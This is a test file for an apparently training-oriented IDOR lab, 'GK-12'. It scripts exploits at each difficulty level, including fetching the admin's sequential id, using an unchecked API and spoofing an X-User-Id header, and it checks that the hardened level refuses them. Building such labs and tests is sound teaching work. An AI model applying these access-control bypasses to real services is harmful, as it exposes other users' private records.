// src/districts/gatekeeper/gk-12-idor-profile/gk-12.spec.ts
import { describe, it, expect } from 'vitest';
import type request from 'supertest';
import { describeExploitMatrix, FLAG_RE } from '../../../../tests/helpers.js';
import { LEVELS } from '../../../core/levels.js';
import { describePilgrimLab, newCtx, pilgrimClient, type PilgrimCtx } from '../_shared/pilgrim-lab.testkit.js';
import { GK12 } from './challenge.js'; // registers GK-12 before createApp() inside freshSession
import { idsFor } from './model.js';

const LAB = '/d/gatekeeper/idor-profile';
type Ctx = PilgrimCtx;
type Script = (c: Ctx) => Promise<request.Response>;

const { home, login } = pilgrimClient(LAB);
const page = (c: Ctx, id: string) => c.agent.get(`${LAB}/profile/${id}?level=${c.level}`);
const api = (c: Ctx, id: string) => c.agent.get(`${LAB}/api/profiles/${id}?level=${c.level}`);
/** The admin's id as a player finds it: from the public directory where it is printed (id 1 below Inquisitor). */
const adminIdFromDirectory = async (c: Ctx): Promise<string> =>
  /citadel_admin: <code>([^<]+)<\/code>/.exec((await home(c)).text)?.[1] ?? 'unknown';
/**
 * Where the exploit is pointed: the admin's REAL id at this level (test seam), so the exploit is also fired at the
 * levels that hide or randomize it (Divine, step-up): they must refuse on ownership, not merely because "1" is no id.
 */
const targetId = (c: Ctx): string => idsFor(c.sid, c.level).admin;

// Acolyte: no ownership check, sequential ids: the admin is 1.
const acolyteExploit: Script = async (c) => { await login(c); return page(c, targetId(c)); };
// Templar: the HTML page checks ownership, the JSON API does not.
const templarExploit: Script = async (c) => { await login(c); return api(c, targetId(c)); };
// Inquisitor: UUID from the public directory; the API trusts the X-User-Id header.
const inquisitorExploit: Script = async (c) => {
  await login(c);
  const printed = await adminIdFromDirectory(c);
  const id = printed === 'unknown' ? targetId(c) : printed;
  return c.agent.get(`${LAB}/api/profiles/${id}?level=${c.level}`).set('X-User-Id', id);
};
const ownId = (c: Ctx): string => idsFor(c.sid, c.level).pilgrim;

describeExploitMatrix<Script>({
  challenge: GK12,
  path: LAB,
  send: (agent, level, script, _url, { sid, app }) => script({ agent, level, sid, app }),
  exploits: { acolyte: acolyteExploit, templar: templarExploit, inquisitor: inquisitorExploit },
  resisted: /Profile not found/,
  resistedStatus: 404, // Divine answers a record that is not yours exactly like one that does not exist
  legit: [
    { name: 'sign in', input: async (c) => login(c), expect: 'Signed in as pilgrim' },
    {
      name: 'own profile page', expect: 'lantern oil',
      input: async (c) => { await login(c); return page(c, ownId(c)); },
    },
    {
      name: 'own profile through the API', expect: 'lantern oil',
      input: async (c) => { await login(c); return api(c, ownId(c)); },
    },
  ],
  malformed: [],
  privileged: null, // the admin never signs in: the lab has no privileged identity to replay
});

describePilgrimLab({
  challenge: GK12,
  path: LAB,
  curl: (level) => ({
    path: '/api/profiles/<profile id>',
    headers: level === 'inquisitor' ? ['X-User-Id: <your user id>'] : [],
  }),
});

describe('GK-12 specifics', () => {
  it('id styles: numeric below Inquisitor (admin is 1), UUIDs from Inquisitor up, no ordering trap for the seam', async () => {
    const c = await newCtx('acolyte');
    // the seam works before any request: the records exist from the first lookup
    expect(idsFor(c.sid, 'acolyte').admin).toBe('1');
    expect(idsFor(c.sid, 'templar').admin).toBe('1');
    for (const l of ['inquisitor', 'divine'] as const) expect(idsFor(c.sid, l).admin).toMatch(/^[0-9a-f-]{36}$/);
  });

  it('records are per player: another player\'s UUIDs differ', async () => {
    const a = await newCtx('divine');
    const b = await newCtx('divine');
    expect(idsFor(a.sid, 'divine').admin).not.toBe(idsFor(b.sid, 'divine').admin);
  });

  it('the directory lists ids up to Inquisitor, names only at Divine', async () => {
    for (const level of LEVELS) {
      const c = await newCtx(level);
      const res = await home(c);
      expect(res.text, level).toContain('citadel_admin');
      if (level === 'divine') expect(res.text).not.toContain(idsFor(c.sid, 'divine').admin);
      else expect(res.text, level).toContain(idsFor(c.sid, level).admin);
    }
  });

  it('below Divine another user\'s record is 403 Forbidden (a real refusal), no flag', async () => {
    for (const level of ['templar', 'inquisitor'] as const) {
      const c = await newCtx(level);
      await login(c);
      const res = await page(c, targetId(c));
      expect(res.status, level).toBe(403);
      expect(res.text, level).toContain('belongs to another user');
      expect(res.text, level).not.toMatch(FLAG_RE);
    }
  });

  it('inquisitor: the session itself does not open the admin record (403); the mobile-API note is on the page', async () => {
    const c = await newCtx('inquisitor');
    await login(c);
    const res = await api(c, targetId(c));
    expect(res.status).toBe(403);
    expect(res.text).not.toMatch(FLAG_RE);
    expect((await home(c)).text).toContain('identifies the user to the API with an X-User-Id header');
  });

  it('only inquisitor mentions X-User-Id on the page', async () => {
    for (const level of ['acolyte', 'templar', 'divine'] as const) {
      const c = await newCtx(level);
      expect((await home(c)).text, level).not.toContain('X-User-Id');
    }
  });

  it('divine ignores X-User-Id and answers unknown and foreign ids identically: 404 with the same body', async () => {
    const c = await newCtx('divine');
    await login(c);
    const admin = targetId(c);
    const foreign = await c.agent.get(`${LAB}/api/profiles/${admin}?level=divine`).set('X-User-Id', admin);
    const unknown = await api(c, 'does-not-exist');
    expect(foreign.status).toBe(404);
    expect(unknown.status).toBe(404);
    expect(foreign.text).toBe(unknown.text);
    expect(foreign.text).not.toMatch(FLAG_RE);
    const pageForeign = await page(c, admin);
    expect(pageForeign.status).toBe(404);
  });

  it('own record is 200 at every level; an unknown id is 404 at every level', async () => {
    for (const level of LEVELS) {
      const c = await newCtx(level);
      await login(c);
      expect((await page(c, ownId(c))).status, level).toBe(200);
      expect((await api(c, ownId(c))).status, level).toBe(200);
      expect((await page(c, 'no-such-id')).status, level).toBe(404);
      expect((await api(c, 'no-such-id')).status, level).toBe(404);
    }
  });

  it('not signed in: 401 "Sign in first" at every level, no record, no flag', async () => {
    for (const level of LEVELS) {
      const c = await newCtx(level);
      for (const res of [await page(c, targetId(c)), await api(c, targetId(c))]) {
        expect(res.status, level).toBe(401);
        expect(res.text, level).toContain('Sign in first');
        expect(res.text, level).not.toMatch(FLAG_RE);
      }
    }
  });

  it('sign-in state is per player: another session is not signed in', async () => {
    const a = await newCtx('acolyte');
    await login(a);
    const b = await newCtx('acolyte');
    expect((await page(b, '1')).status).toBe(401);
  });

  it('the profile page form (no action) is not needed: sign-in is the only form', async () => {
    const c = await newCtx('acolyte');
    const forms = [...(await home(c)).text.matchAll(/<form[^>]*>/g)].map((m) => m[0]);
    expect(forms).toHaveLength(1);
  });

  it('strange ids are 404 (or 200 for the own id), never a 500 or a flag', async () => {
    for (const level of LEVELS) {
      const c = await newCtx(level);
      await login(c);
      for (const id of ['__proto__', 'constructor', '%00', 'x'.repeat(3000), '-1', '1.5']) {
        for (const res of [await page(c, id), await api(c, id)]) {
          expect(res.status, `${level} ${id.slice(0, 10)}`).toBe(404);
          expect(res.text, level).not.toMatch(FLAG_RE);
        }
      }
    }
  });
});
